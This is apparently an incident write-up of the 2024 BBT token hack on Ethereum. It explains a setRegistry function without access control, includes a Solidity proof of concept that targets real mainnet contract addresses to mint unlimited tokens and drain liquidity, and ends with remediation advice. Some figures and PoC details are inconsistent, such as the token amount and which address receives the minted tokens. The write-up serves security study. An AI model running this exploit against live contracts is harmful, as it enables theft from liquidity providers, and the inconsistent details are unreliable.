# BBT — Unlimited Mint Vulnerability via `setRegistry` Manipulation

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | BBT (BBtoken) |
| **Chain** | Ethereum |
| **Loss** | ~5.06 ETH |
| **Attacker** | [0xc9a5643e](https://etherscan.io/address/0xc9a5643ed8e4cd68d16fe779d378c0e8e7225a54) |
| **Attack Contract** | [0xf5610cf8](https://etherscan.io/address/0xf5610cf8c27454b6d7c86fccf1830734501425c5) |
| **BBtoken** | [0x3541499c](https://etherscan.io/address/0x3541499cda8CA51B24724Bb8e7Ce569727406E04) |
| **BLM Token** | [0xEa0abF7A](https://etherscan.io/address/0xEa0abF7AB2F8f8435e7Dc4932FFaB37761267843) |
| **Root Cause** | The `setRegistry()` function lacks access control, allowing anyone to redirect the registry pointer to an arbitrary address. The attacker deployed a contract at a CREATE2-predictable address, registered it as the registry, then called `mint()` to issue unlimited BBT |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/BBT_exp.sol) |

---

## 1. Vulnerability Overview

BBtoken's `setRegistry()` function has no access control, allowing anyone to change the registry address. The attacker deployed a fake registry contract at a CREATE2-predictable address, registered it via `setRegistry()`, then called `mint()` to issue 10 quintillion (10e28) BBT tokens without restriction. The minted BBT was swapped via Uniswap V2 to steal 5.06 ETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: setRegistry has no access control
address public registry;

function setRegistry(address _registry) external {
    // No onlyOwner — anyone can change the registry
    registry = _registry;
}

function mint(address to, uint256 amount) external {
    require(msg.sender == registry, "not registry");
    _mint(to, amount);  // Unlimited minting if registry is the attacker
}

// ✅ Safe code: onlyOwner applied to setRegistry
address public registry;

function setRegistry(address _registry) external onlyOwner {
    require(_registry != address(0), "zero address");
    registry = _registry;
    emit RegistryUpdated(_registry);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Deploy fake registry at CREATE2-predicted address
  │         └─ Pre-compute address using salt + bytecode
  │
  ├─→ [2] Call BBtoken.setRegistry(fakeRegistry)
  │         └─ No access control → changed immediately
  │
  ├─→ [3] Call fakeRegistry.mint(attacker, 10e28)
  │         └─ Registry is attacker's contract → unlimited minting
  │
  ├─→ [4] Swap BBT → WETH (two Uniswap V2 paths)
  │
  └─→ [5] Profit: 5.06 ETH
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IBBtoken {
    function setRegistry(address _registry) external;
    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
}

contract FakeRegistry {
    IBBtoken constant bb = IBBtoken(0x3541499cda8CA51B24724Bb8e7Ce569727406E04);

    constructor() {
        // [3] Call mint immediately in the constructor
        bb.mint(tx.origin, 10_000_000_000_000_000_000_000_000_000);
    }
}

contract AttackContract {
    IBBtoken  constant bb     = IBBtoken(0x3541499cda8CA51B24724Bb8e7Ce569727406E04);
    IUniRouter constant router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function testExploit() external {
        // [1] Deploy fake registry at CREATE2-predicted address
        bytes32 salt = bytes32(uint256(1));
        address predicted = computeCreate2Address(salt, type(FakeRegistry).creationCode);

        // [2] Change registry to the predicted address
        bb.setRegistry(predicted);

        // [3] Deploy FakeRegistry → mint executes in constructor
        new FakeRegistry{salt: salt}();

        // [4] Swap minted BBT → WETH → ETH
        uint256 bbtBalance = IERC20(address(bb)).balanceOf(address(this));
        bb.approve(address(router), bbtBalance);

        address[] memory path = new address[](2);
        path[0] = address(bb);
        path[1] = WETH;
        router.swapExactTokensForETH(bbtBalance, 0, path, address(this), block.timestamp);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control + Unlimited Token Minting |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (setRegistry + CREATE2 + mint) |
| **DApp Category** | ERC20 Token + Registry Pattern |
| **Impact** | LP funds drained via unlimited token minting |

## 6. Remediation Recommendations

1. **`setRegistry` onlyOwner**: Apply owner-only access control to the registry change function
2. **Immutable Registry**: Set the registry in the constructor at deployment and disallow subsequent changes
3. **Multi-condition `mint` Caller Validation**: Require additional signatures or conditions beyond just the registry address
4. **Prevent CREATE2 Address Prediction**: Include unpredictable elements such as `block.timestamp` in the salt

## 7. Lessons Learned

- In the registry pattern, admin functions like `setRegistry()` must always enforce access control.
- Pre-computing an address via CREATE2 allows the registry slot to be reserved before deployment, enabling timing attacks.
- Granting `mint()` authority solely to a single address (the registry) means the entire system collapses the moment that address is compromised.